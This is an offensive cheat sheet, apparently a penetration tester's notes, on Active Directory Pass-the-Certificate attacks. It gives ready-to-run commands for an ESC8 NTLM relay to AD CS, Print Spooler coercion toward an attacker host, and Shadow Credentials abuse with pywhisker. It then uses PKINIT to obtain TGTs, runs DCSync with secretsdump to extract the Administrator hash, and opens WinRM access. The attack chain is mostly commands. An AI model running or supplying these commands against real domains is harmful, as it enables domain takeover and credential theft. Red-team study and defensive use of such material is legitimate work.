**Overview:**
- PKINIT is a Kerberos extension that allows public key cryptography for initial authentication. Pass-the-Certificate abuses this by using X.509 certificates to obtain TGTs without a password.
- Two main attack paths lead to a usable certificate: ESC8 and Shadow Credentials.
- **ESC8** relays inbound NTLM authentication to the AD CS HTTP web enrollment endpoint (`/CertSrv`). The CA issues a certificate for the relayed account, which can then be used to obtain a TGT.
- **Shadow Credentials** abuses write access over a victim user's `msDS-KeyCredentialLink` attribute (visible as `AddKeyCredentialLink` in BloodHound). Writing a public key to this attribute allows obtaining a TGT as that user via PKINIT.
- Once a TGT is obtained as a machine account (e.g. `DC01$`), DCSync becomes available. As a user account, access depends on group membership.
- MITRE ATT&CK: T1550.003
---
## ESC8 - NTLM Relay to AD CS Web Enrollment

```bash
impacket-ntlmrelayx -t http://<ca-ip>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

Starts a relay listener targeting the AD CS web enrollment endpoint. Waits for inbound NTLM authentication to relay.

```bash
python3 printerbug.py <domain>/<user>:<password>@<dc-ip> <attacker-ip>
```

Forces the target machine account to authenticate against the attacker host by abusing the Print Spooler service. Requires the Spooler service to be running on the target. Tool: [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)

The relay captures a `.pfx` certificate for the machine account (e.g. `DC01$.pfx`).

---
## Shadow Credentials (msDS-KeyCredentialLink)


```bash
pywhisker --dc-ip <dc-ip> -d <domain> -u <user> -p <password> --target <victim> --action add
```

Generates an X.509 certificate, writes the public key to the victim's `msDS-KeyCredentialLink` attribute, and outputs a `.pfx` file with its password. Tool: [https://github.com/ShutdownRepo/pywhisker](https://github.com/ShutdownRepo/pywhisker)

---
## Pass the Certificate

```bash
python3 gettgtpkinit.py -cert-pfx <file>.pfx -pfx-pass '<pfx-password>' -dc-ip <dc-ip> <domain>/<user> /tmp/<user>.ccache
```

Uses the certificate to request a TGT via PKINIT. For machine accounts (no PFX password from ESC8), omit `-pfx-pass`. Output is a ccache file. Tool: [https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

---
## Pass the Ticket

```bash
export KRB5CCNAME=/tmp/<user>.ccache
klist
```

Sets the active ticket to the obtained TGT. Verify validity with `klist`.

```bash
impacket-secretsdump -k -no-pass -dc-ip <dc-ip> -just-dc-user Administrator '<domain>/<DC-machine-account>$'@<dc-fqdn>
```

DCSync as the DC machine account to retrieve the Administrator NTLM hash. Only available when the certificate was obtained for a domain controller machine account (e.g. via ESC8).

```bash
evil-winrm -i <target-fqdn> -r <domain>
```

Connects via WinRM using the active Kerberos ticket. Available if the victim user is a member of `Remote Management Users`. Requires `krb5.conf` to be configured. See `pass the ticket - linux.md`.